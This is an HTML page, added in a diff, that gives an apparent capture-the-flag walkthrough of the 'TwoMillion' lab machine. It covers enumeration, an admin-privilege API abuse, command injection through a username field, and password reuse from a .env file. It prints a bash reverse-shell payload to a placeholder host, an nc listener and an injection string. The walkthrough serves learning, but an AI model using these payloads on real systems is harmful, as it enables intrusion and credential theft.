@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width" initial-scale="1.0">
+        <title>TwoMillion</title>
+        <link rel="stylesheet" href="style3.css">
+    </head>
+    <body>
+        <div class="header-content">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSsftl35uZBV9wYNE66Qv44yHgWsTC3ugTLxw&s" alt="Logo" class="logo">
+            <h1>TwoMillion Reportings</h1>
+            </div>
+            <hr>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*hTcYkYlMPt_llAwFmwGOYw.png">
+            <h2>Enumeration</h2>
+            <p class="paragraph">
+                As always we will start with an nmap scan. When I initially ran my nmap<br>scan it said there was a redirect to 2million.htb. We can add a reference to the /etc/hosts<br>file to be able to access the the site.
+                <p class="script-container">
+                    nano sudo /etc/hosts
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*n1Xa7dooeshWz-cMNTnl4A.png">
+            <p class="script-container">
+                nmap -sV -sC -oA initial 2million.htb
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*MEBFLVlKHYhg5ORuNFZKOQ.png">
+            <p class="paragraph">
+                We can see two open ports:<br><br>
+                - 22: SSH which can allow for remote access if we can aquire some credientals
+                - 80: HTTP site. This will most likely be the avenue to get a foothold
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*5eeHTlMBn8uQQcpHkm87bg.png">
+            <h3>Invite Code Rabbit Hole</h3>
+            <p class="paragraph">
+                Poking around the website I came across the invite code page.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*qRJZzAXK3OdTUn2LpquynA.png">
+            <p class="paragraph">
+                We can view the source of the page to attempt to find an Invite Code. The source references a inviteapi.min.js library.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*h7a5jBpKwQLX1V3ey-h1PQ.png">
+            <p class="paragraph">
+                Viewing the inviteapi.min.js library reveals a makeInviteCode function.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*-w7Ftywbup3Muuiq0Y3Fhw.png">
+            <p class="paragraph">
+                We can inspect the page and use the console to run the makeInviteCode function:
+                <p class="script-container">
+                    makeInviteCode()
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*_zI7PbI2JpO7MqNLjYxVfA.png">
+            <p class="paragraph">
+                The results are ROT13 encoded. We can use a website to easily decode this.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*rlYprymbFdvJPcT-pXxGOQ.png">
+            <p class="paragraph">
+                We can now make an API request to /api/v1/invite/generate. For this I used BurpSuite.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*tIW3JBxDXKQcwtCSO-l7fQ.png">
+            <p class="paragraph">
+                This invite code is also encoded. From experience I believe it is base64 encoded. We can decode this via the Linux terminal.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*IDMXg1wIT9EHmyqSObzqrQ.png">
+            <p class="paragraph">
+                With this invite code we can register for the site:
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*sYdmijtWt434PvLuUTSgrA.png">
+            <p class="paragraph">
+                Now we can login to the site.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*OMMxuUW39Sa1E-i0ELvO-w.png">
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*tQ_OvBh0t7_wEhE7VELSig.png">
+            <p class="paragraph">
+                Not much could be found after I logged in.
+            </p>
+            <h2>Foothold</h2>
+            <p class="paragraph">
+                I noticed the generate VPN function makes another API call. I decided to take interest<br>in the API again and was able to get a list of commands by sending a GET request to /api/v1.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/1*JjjniFGrNtmAvd2PLbYhaA.png">
+            <p class="paragraph">
+                There are admin specific API calls that we can make. Attempting to generate the VPN results in a 401 unauthorized error.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*2FtPQSeE6-fRbFVpZdMPWw.png">
+            <p class="paragraph">
+                Since this was unsuccessful I tried the admin settings request. I was not sure what this<br>would do but the hope was we could edit the admin account somehow which could lead to compromising<br>the website.<br><br>
+                The first request returned an error message saying incorrect content-type and the second stated that we were missing the email parameter.
+                <p class="script-container">
+                    Content-Type: application/json<br>
+                    {<br>
+                    "email":"email"<br>
+                    }<br>
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*Luc66keOfqK73fRsO5_HDA.png">
+            <p class="paragraph">
+                According to the error message we are missing the is_admin parameter. I tried “is_admin”:”True” but it was looking for a 0 or 1.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*ePQYUdeFOW3_Ge3vk9QwqA.png">
+            <p class="paragraph">
+                I tried it again setting the parameter to 1 and it worked.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*GowVthsb9aL2CLR0f6MLRQ.png">
+            <p class="paragraph">
+                The request needs a valid email. I used the email I set the account up with and the website responded with<br> “is_admin”:1. This suggests that the account was elevated to admin<br> privileges.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*Pey1UFuJ-h9GQ1017lLNKg.png">
+            <p class="paragraph">
+                To verify the admin status we can try to use the generate vpn API call.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*g1lbewoM66_zumLYJiBZKA.png">
+            <p class="paragraph">
+                The response says the request is missing the parameter username. We will add it with a generic username.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*lPGR_eGp3IxXzlZArTAGeg.png">
+            <p class="paragraph">
+                This works and the response is based on the username being passed. It is<br>possible that the username is being run through a script to generate the file.<br>To test this we can try to send a command to be executed. We will use the ;<br>to mark the end of the line and we can add a command to be executed. I am<br>running whoami followed by a #. The character will act as a comment to any<br>code in the script following our command. This can prevent errors. The<br>request body now looks like this:
+                <p class="script-container">
+                    {<br>
+                        "username":"test; whoami #"<br>
+                      }
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*SI3ZlmhnvKu0XsAQNDjlWw.png">
+            <p class="paragraph">
+                We have found a vulnerability that allows an attacker to execute commands<br>on the target system. We can pass a bash reverse shell payload to the target<br>machine.
+                <p class="script-container">
+                    {<br>
+                        "username":"test; bash -c 'bash -i >& /dev/tcp/YourIP/YourPort 0>&1' #"<br>
+                      }
+                </p>
+                We also need to setup a listener to catch the reverse shell. We can use netcat for this:
+                <p class="script-container">
+                    nc -nlvp 80
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*Od12XlELxOTYuQ_leFnooQ.png">
+            <p class="paragraph">
+                We now have a connection back to the target machine.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*c9Oi7COYwe1cqnN3Wtgj6Q.png">
+            <h2>Privilege Escalation</h2>
+            <p class="paragraph">
+                Now the name of the game is getting admin credentials. First we will use python3 to generate a more stable shell.
+                <p class="script-container">
+                    python3 -c 'import pty;pty.spawn("/bin/bash")'
+                </p>
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*7G-w8DyMDiJNfsxyOnRD5g.png">
+            <p class="paragraph">
+                Now we can start looking around the machine. I started in the working directory for the www-data user. A .env,<br>file exist in the current directory. Viewing the file gives us a username and password for the<br>local database.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*-BkgQc8Hyq9kgsYTQeILjg.png">
+            <p class="paragraph">
+                Password reuse is command and could be happening here. I will attempt to<br>switch to the admin user and use the password from the file.
+            </p>
+            <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*plelqwyaJt9nUinvZA40Dw.png">
+            <p class="paragraph">
+                We are able to log in as the admin user and access the user.txt file under /home/admin.<br><br>
+                Thank you for joining me through this journey, I hope you had fun and<br>learned something. Feel free to reach out to me if you have any questions.<br>
+            </p>
+    </body>
+    <footer class="footer">
+        <p>&copy; 2024 <a href="https://Iam.Gh0st.Net">Iam.Gh0st.net</a> All rights reserved.</p>
+    </footer>
+</html>
